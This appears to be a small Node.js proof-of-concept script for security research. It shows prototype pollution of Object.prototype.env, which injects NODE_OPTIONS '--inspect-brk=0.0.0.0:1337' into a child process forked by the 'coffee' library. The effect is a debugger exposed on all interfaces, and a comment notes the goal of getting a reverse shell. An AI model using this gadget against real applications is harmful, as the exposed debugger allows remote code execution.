const coffee = require('coffee');

if (process.argv[2] === 'child') {
  console.log(`Hello from ${process.argv[2]}!`);
} else {
  
  // you can also control the options parameter for child_process.fork()
  // TODO: try to get reverse shell 
  Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };
  
  coffee.fork(__filename, ['child']).debug();
}